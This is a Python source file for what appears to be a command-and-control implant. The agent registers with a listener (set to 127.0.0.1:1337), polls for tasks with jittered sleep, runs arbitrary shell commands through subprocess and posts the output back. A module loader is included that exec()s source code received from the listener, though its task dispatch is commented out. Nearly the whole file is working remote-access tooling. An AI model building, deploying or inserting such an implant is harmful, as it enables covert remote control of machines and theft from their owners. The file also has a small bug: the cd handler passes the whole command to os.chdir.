import json
import os
import random
import subprocess
import time
import urllib.error
import urllib.request

REMOTE_HOST = "127.0.0.1"
REMOTE_PORT = 1337
SLEEP_TIME = 1.0
SLEEP_TIME_JITTER = 0.5
TASKS_URL_PATHS = ["/tasks"]
RESULTS_URL_PATHS = ["/results"]
REGISTRATION_URL_PATHS = ["/register"]


def shell_capability(command, timeout, blind):
    if command[:3].strip().lower() == "cd ":
        directory_to_change_to = command.replace("cd ", "", 1)
        os.chdir(command)
        return {
            "success": True,
            "message": f"Changed to directory: {directory_to_change_to}",
            "data": {},
        }
    else:
        output = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            timeout=timeout,
        )

        if blind:
            output = ""
        else:
            output = (output.stdout + output.stderr).decode("utf-8", errors="ignore")

        return {
            "success": True,
            "message": output,
            "data": {},
        }


class ModuleLoader:
    def __init__(self):
        self._loaded_modules = {}

    def load_module(self, module_name, module_source_code):
        if module_name in self._loaded_modules:
            return {
                "success": False,
                "message": 'Module "' + module_name + '" is already loaded',
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": "Error loading module : " + str(exc),
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Error loading module : Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": "Loaded module : " + module_name,
            "data": {},
        }

    def unload_module(self, module_name: str):
        if module_name in self._loaded_modules:
            del self._loaded_modules[module_name]
            return {
                "success": True,
                "message": "Unloaded module : " + module_name,
                "data": {},
            }
        else:
            return {
                "success": False,
                "message": 'Module "' + module_name + '" is not currently loaded',
                "data": {},
            }

    def reload_module(self, module_name, module_source_code):
        if module_name not in self._loaded_modules:
            return {
                "success": False,
                "message": 'Module "' + module_name + '" is not currently loaded',
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": "Error reloading module: " + str(exc),
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Error reloading module: Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": "Reloaded module: " + module_name,
            "data": {},
        }

    def run_module(self, module_name, arguments, connection):
        self._loaded_modules[module_name].run_module(arguments, connection)

    def get_loaded_module_names(self):
        return list(self._loaded_modules.keys())


class Connection:
    def __init__(
        self,
        remote_host,
        remote_port,
        sleep_time,
        sleep_time_jitter,
        tasks_url_paths,
        results_url_paths,
        registration_url_paths,
    ):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.sleep_time = sleep_time
        self.sleep_time_jitter = sleep_time_jitter
        self.tasks_url_paths = tasks_url_paths
        self.results_url_paths = results_url_paths
        self.registration_url_paths = registration_url_paths

        self._listener_base_url = f"http://{self.remote_host}:{self.remote_port}"
        self._agent_id = None

    def register_with_listener(self):
        agent_id_response = urllib.request.urlopen(
            f"{self._listener_base_url}{random.choice(self.registration_url_paths)}",
        )
        agent_id = json.loads(agent_id_response.read().decode())["agent_id"]
        self._agent_id = agent_id
        return agent_id

    def get_tasks_from_listener(self):
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        tasks_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.tasks_url_paths)}",
            headers={"Cookie": self._agent_id},
        )
        tasks_response = urllib.request.urlopen(tasks_request)
        tasks = json.loads(tasks_response.read().decode())
        return tasks

    def post_results_to_listener(self, task_id, success, message, data):
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        post_results_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.results_url_paths)}",
            data=json.dumps(
                {
                    "agent_id": self._agent_id,
                    "task_id": task_id,
                    "result": {
                        "success": success,
                        "message": message,
                        "data": data,
                    },
                },
            ).encode(),
            method="POST",
        )
        urllib.request.urlopen(post_results_request)


class Agent:
    def __init__(
        self,
        connection,
        module_loader,
    ):
        self.connection = connection
        self.module_loader = module_loader

    def _sleep(self):
        jitter_range = self.connection.sleep_time * self.connection.sleep_time_jitter
        random_jitter = random.uniform(-jitter_range, jitter_range)
        time_to_sleep = self.connection.sleep_time + random_jitter
        if time_to_sleep < 0:
            time_to_sleep = 0
        time.sleep(time_to_sleep)

    def run_agent(self):
        while True:
            try:
                self.connection.register_with_listener()
                break
            except urllib.error.URLError:
                self._sleep()

        while True:
            tasks = self.connection.get_tasks_from_listener()
            print(tasks)
            for task in tasks:
                if task["command"] == "shell":
                    result = shell_capability(
                        task["arguments"]["command"],
                        task["arguments"]["timeout"],
                        task["arguments"]["blind"],
                    )
                    self.connection.post_results_to_listener(task["task_id"], **result)

                # if task["command"] == "load_module":
                #     module_name = task["arguments"][0]
                #     module_source_code = task["arguments"][1]
                #     result = self.module_loader.load_module(
                #         module_name, module_source_code
                #     )
                #     self.connection.post_results_to_listener(task["task_id"], **result)
                # elif task["command"] == "unload_module":
                #     module_name = task["arguments"][0]
                #     result = self.module_loader.unload_module(module_name)
                #     self.connection.post_results_to_listener(task["task_id"], **result)
                # elif task["command"] == "reload_module":
                #     module_name = task["arguments"][0]
                #     result = self.module_loader.unload_module(module_name)
                #     self.connection.post_results_to_listener(task["task_id"], **result)
                # else:
                #     module_name = task["command"]
                #     arguments = task["arguments"]
                #     self.module_loader.run_module(
                #         module_name, arguments, self.connection
                #     )

            self._sleep()


def main():
    connection = Connection(
        remote_host=REMOTE_HOST,
        remote_port=REMOTE_PORT,
        sleep_time=SLEEP_TIME,
        sleep_time_jitter=SLEEP_TIME_JITTER,
        tasks_url_paths=TASKS_URL_PATHS,
        results_url_paths=RESULTS_URL_PATHS,
        registration_url_paths=REGISTRATION_URL_PATHS,
    )
    module_loader = ModuleLoader()
    agent = Agent(connection, module_loader)
    agent.run_agent()


if __name__ == "__main__":
    main()
